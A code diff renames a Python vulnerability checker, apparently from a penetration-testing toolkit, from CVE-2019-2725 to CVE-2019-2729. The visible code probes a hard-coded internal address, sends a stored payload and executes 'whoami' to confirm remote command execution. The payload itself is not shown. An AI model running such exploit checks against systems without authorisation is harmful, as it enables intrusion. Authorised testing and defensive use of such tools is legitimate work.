@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 '''
-name: CVE-2019-2725漏洞
-description: CVE-2019-2725漏洞可执行任意命令
+name: CVE-2019-2729漏洞
+description: CVE-2019-2729漏洞可执行任意命令
 '''
 
 import sys
@@ -13,7 +13,7 @@ import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-class CVE_2019_2725_BaseVerify:
+class CVE_2019_2729_BaseVerify:
     def __init__(self, url):
         self.url = url
         self.capta='' 
@@ -9783,7 +9783,7 @@ class CVE_2019_2725_BaseVerify:
                 if self.capta in check_req.text:
                     flag = 1
                     cmd_req = requests.post(url, headers = self.cmd_headers, data = self.payload, timeout = 1)
-                    print('存在CVE-2019-2725漏洞,执行whoami命令结果为:', cmd_req.text)
+                    print('存在CVE-2019-2729漏洞,执行whoami命令结果为:', cmd_req.text)
                     break
             except Exception as e:
                 print(e)
@@ -9796,8 +9796,8 @@ class CVE_2019_2725_BaseVerify:
             return False
 
 if __name__ == '__main__':
-    CVE_2019_2725 = CVE_2019_2725_BaseVerify('http://10.3.15.56:9000')
-    CVE_2019_2725.run()
+    CVE_2019_2729 = CVE_2019_2729_BaseVerify('http://10.3.15.56:9000')
+    CVE_2019_2729.run()
 
 
 
